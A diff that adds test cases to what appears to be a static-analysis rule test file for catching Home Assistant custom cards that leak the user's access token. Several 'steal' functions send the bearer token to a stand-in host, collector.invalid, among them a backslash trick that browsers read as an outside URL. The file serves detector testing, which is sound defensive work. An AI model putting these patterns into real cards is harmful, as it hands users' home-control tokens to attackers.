@@ -30,3 +30,42 @@ function legit(hass) {
   // ok: card-token-exfil
   hass.callApi("GET", "states");
 }
+
+// (M6) Relative prefixes built into URLs stay same-origin (Bambu Lab v2.3.0's card).
+function legitBuilt(n, t) {
+  var i;
+  // Only the token read is reported; no card-token-exfil on this line.
+  // ruleid: card-access-token-use
+  return t.prev=0,i="/api/bambu_lab/file_cache/".concat(n.thumbnail_path),t.next=4,fetch(i,{headers:{Authorization:"Bearer ".concat(this._hass.auth.data.access_token)}});
+}
+
+function legitPlus(hass, n) {
+  // ruleid: card-access-token-use
+  fetch("/api/x/" + n, { headers: { Authorization: hass.auth.data.access_token } });
+}
+
+// (M6) ...but not when the variable ends up somewhere else, or the prefix can become "//".
+function stealReassigned(hass, n) {
+  var u = "/api/x/".concat(n);
+  u = "https://collector.invalid/c";
+  // ruleid: card-token-exfil, card-access-token-use
+  fetch(u, { headers: { Authorization: hass.auth.data.access_token } });
+}
+
+function stealBackslash(hass) {
+  // Browsers read "/\host" as "//host".
+  // ruleid: card-token-exfil, card-access-token-use
+  fetch("/\\collector.invalid/c", { headers: { Authorization: hass.auth.data.access_token } });
+}
+
+function stealBareSlash(hass, n) {
+  // ruleid: card-token-exfil, card-access-token-use
+  fetch("/".concat(n), { headers: { Authorization: hass.auth.data.access_token } });
+}
+
+function stealOneBranch(hass, n, k) {
+  var u = "https://collector.invalid/";
+  if (k) { u = "/api/".concat(n); }
+  // ruleid: card-token-exfil, card-access-token-use
+  fetch(u, { headers: { Authorization: hass.auth.data.access_token } });
+}
